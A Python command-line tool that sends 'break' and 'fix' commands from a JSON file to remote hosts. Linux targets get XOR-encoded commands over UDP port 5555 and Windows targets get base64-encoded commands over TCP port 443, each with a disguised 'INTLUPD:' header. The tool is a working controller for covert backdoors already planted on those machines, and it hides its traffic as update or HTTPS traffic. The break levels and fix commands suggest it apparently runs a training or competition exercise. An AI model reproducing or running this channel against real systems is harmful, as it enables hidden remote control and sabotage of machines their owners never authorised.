import json
import socket
import base64
import sys

class BreakManager:
    """Manages network breaks for systems and protocols"""
    
    def __init__(self, config_file='BreakLevels.json'):
        self.config_file = config_file
        self.breaks_data = self.load_config()
        self.broken_services = set()
    
    def load_config(self):
        """Load break configuration from JSON file"""
        try:
            with open(self.config_file, 'r') as f:
                return json.load(f)
        except FileNotFoundError:
            print(f"Error: {self.config_file} not found")
            sys.exit(1)
        except json.JSONDecodeError as e:
            print(f"Error parsing {self.config_file}: {e}")
            sys.exit(1)
    
    def xor_encode(self, data, key=0x55):
        """XOR encode data with key (for Linux module)"""
        return bytes([b ^ key for b in data])
    
    def is_windows_command(self, command):
        """Detect if command is for Windows based on syntax"""
        windows_indicators = [
            'Stop-Service', 'Start-Service', 'Set-Service', 
            'New-NetFirewall', 'Remove-NetFirewall', 'Set-DnsClient',
            'Set-ItemProperty', 'Remove-DnsServer', 'takeown', 'icacls',
            'netsh', 'PowerShell', 'Remove-Item'
        ]
        return any(indicator in command for indicator in windows_indicators)
    
    def send_linux_command(self, ip, command):
        """Send command to Linux system via UDP port 5555"""
        try:
            magic_header = b"INTLUPD:"
            encoded_cmd = self.xor_encode(command.encode())
            payload = magic_header + encoded_cmd
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(payload, (ip, 5555))
            
            try:
                sock.settimeout(5)
                output, _ = sock.recvfrom(4096)
                print(f"[+] Response from {ip}:\n{output.decode('utf-8', errors='ignore')}")
                return True
            except socket.timeout:
                print(f"[!] No response from {ip} (timeout)")
                return True  # Command sent, no response expected
            finally:
                sock.close()
        except Exception as e:
            print(f"[!] Error sending Linux command to {ip}: {e}")
            return False
    
    def send_windows_command(self, ip, command):
        """Send command to Windows system via TCP port 443"""
        try:
            magic_header = "INTLUPD:"
            encoded_cmd = base64.b64encode(command.encode()).decode()
            payload = magic_header + encoded_cmd
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((ip, 443))
            sock.send(payload.encode())
            
            try:
                output = sock.recv(4096)
                print(f"[+] Response from {ip}:\n{output.decode('utf-8', errors='ignore')}")
                return True
            except socket.timeout:
                print(f"[!] No response from {ip} (timeout)")
                return True  # Command sent
            finally:
                sock.close()
        except Exception as e:
            print(f"[!] Error sending Windows command to {ip}: {e}")
            return False
    
    def trigger_break(self, level, target=None):
        """
        Trigger a break for specific level and optionally specific target
        Args:
            level (str): Break level (e.g., 'lvl1', 'lvl2', 'lvl3', 'lvl4')
            target (str): Optional specific target IP or IP:port (e.g., '10.x.1.60' or '10.x.2.10:22')
                         If None, triggers all breaks for the level
        """
        if 'breaks' not in self.breaks_data:
            print("[!] No breaks section found in config")
            return False
        
        if level not in self.breaks_data['breaks']:
            print(f"[!] Level '{level}' not found. Available levels: {list(self.breaks_data['breaks'].keys())}")
            return False
        
        breaks = self.breaks_data['breaks'][level]
        
        if target:
            # Trigger single target
            if target not in breaks:
                print(f"[!] Target '{target}' not found in level '{level}'")
                return False
            
            command = breaks[target]
            if not command:
                print(f"[!] No command defined for {target}")
                return False
            
            # Extract IP (remove port if present)
            ip = target.split(':')[0]
            
            print(f"[*] Triggering break for {target}")
            print(f"[*] Command: {command}")
            
            if self.is_windows_command(command):
                print(f"[*] Detected Windows target, using TCP:443")
                success = self.send_windows_command(ip, command)
            else:
                print(f"[*] Detected Linux target, using UDP:5555")
                success = self.send_linux_command(ip, command)
            
            if success:
                self.broken_services.add(f"{level}:{target}")
                print(f"[+] Successfully triggered break for {target}")
            
            return success
        else:
            # Trigger all targets in level
            print(f"[*] Triggering all breaks for level '{level}'")
            success_count = 0
            total_count = 0
            
            for target, command in breaks.items():
                if not command:
                    print(f"[!] Skipping {target} (no command defined)")
                    continue
                
                total_count += 1
                ip = target.split(':')[0]
                
                print(f"\n[*] Triggering break for {target}")
                print(f"[*] Command: {command}")
                
                if self.is_windows_command(command):
                    print(f"[*] Detected Windows target, using TCP:443")
                    success = self.send_windows_command(ip, command)
                else:
                    print(f"[*] Detected Linux target, using UDP:5555")
                    success = self.send_linux_command(ip, command)
                
                if success:
                    self.broken_services.add(f"{level}:{target}")
                    success_count += 1
            
            print(f"\n[+] Completed: {success_count}/{total_count} breaks triggered successfully")
            return success_count > 0
    
    def trigger_fix(self, level, target=None):
        """
        Trigger a fix for specific level and optionally specific target
        Args:
            level (str): Break level (e.g., 'lvl1', 'lvl2', 'lvl3', 'lvl4')
            target (str): Optional specific target IP or IP:port
        """
        if 'fixs' not in self.breaks_data:
            print("[!] No fixs section found in config")
            return False
        
        if level not in self.breaks_data['fixs']:
            print(f"[!] Level '{level}' not found. Available levels: {list(self.breaks_data['fixs'].keys())}")
            return False
        
        fixes = self.breaks_data['fixs'][level]
        
        if target:
            # Fix single target
            if target not in fixes:
                print(f"[!] Target '{target}' not found in level '{level}'")
                return False
            
            command = fixes[target]
            if not command:
                print(f"[!] No fix command defined for {target}")
                return False
            
            ip = target.split(':')[0]
            
            print(f"[*] Triggering fix for {target}")
            print(f"[*] Command: {command}")
            
            if self.is_windows_command(command):
                print(f"[*] Detected Windows target, using TCP:443")
                success = self.send_windows_command(ip, command)
            else:
                print(f"[*] Detected Linux target, using UDP:5555")
                success = self.send_linux_command(ip, command)
            
            if success:
                self.broken_services.discard(f"{level}:{target}")
                print(f"[+] Successfully triggered fix for {target}")
            
            return success
        else:
            # Fix all targets in level
            print(f"[*] Triggering all fixes for level '{level}'")
            success_count = 0
            total_count = 0
            
            for target, command in fixes.items():
                if not command:
                    print(f"[!] Skipping {target} (no fix command defined)")
                    continue
                
                total_count += 1
                ip = target.split(':')[0]
                
                print(f"\n[*] Triggering fix for {target}")
                print(f"[*] Command: {command}")
                
                if self.is_windows_command(command):
                    print(f"[*] Detected Windows target, using TCP:443")
                    success = self.send_windows_command(ip, command)
                else:
                    print(f"[*] Detected Linux target, using UDP:5555")
                    success = self.send_linux_command(ip, command)
                
                if success:
                    self.broken_services.discard(f"{level}:{target}")
                    success_count += 1
            
            print(f"\n[+] Completed: {success_count}/{total_count} fixes triggered successfully")
            return success_count > 0
    
    def list_breaks(self, level=None):
        """List available breaks"""
        if level:
            if level in self.breaks_data['breaks']:
                print(f"\n[*] Breaks for level '{level}':")
                for target, command in self.breaks_data['breaks'][level].items():
                    status = "✓" if f"{level}:{target}" in self.broken_services else " "
                    cmd_preview = command[:60] + "..." if len(command) > 60 else command
                    print(f"  [{status}] {target}: {cmd_preview}")
            else:
                print(f"[!] Level '{level}' not found")
        else:
            print("\n[*] Available break levels:")
            for lvl in self.breaks_data['breaks'].keys():
                count = len([t for t in self.breaks_data['breaks'][lvl] if self.breaks_data['breaks'][lvl][t]])
                active = len([s for s in self.broken_services if s.startswith(f"{lvl}:")])
                print(f"  {lvl}: {count} targets ({active} active breaks)")


def main():
    """Main function for CLI usage"""
    if len(sys.argv) < 3:
        print("Usage:")
        print("  python trigger_break.py break <level> [target]")
        print("  python trigger_break.py fix <level> [target]")
        print("  python trigger_break.py list [level]")
        print("\nExamples:")
        print("  python trigger_break.py break lvl1              # Break all lvl1 targets")
        print("  python trigger_break.py break lvl2 10.x.1.60    # Break specific target")
        print("  python trigger_break.py fix lvl1 10.x.2.10:22   # Fix specific target")
        print("  python trigger_break.py list lvl1               # List all lvl1 breaks")
        sys.exit(1)
    
    manager = BreakManager()
    action = sys.argv[1].lower()
    
    if action == 'list':
        level = sys.argv[2] if len(sys.argv) > 2 else None
        manager.list_breaks(level)
    elif action == 'break':
        level = sys.argv[2]
        target = sys.argv[3] if len(sys.argv) > 3 else None
        manager.trigger_break(level, target)
    elif action == 'fix':
        level = sys.argv[2]
        target = sys.argv[3] if len(sys.argv) > 3 else None
        manager.trigger_fix(level, target)
    else:
        print(f"[!] Unknown action: {action}")
        sys.exit(1)


if __name__ == "__main__":
    main()
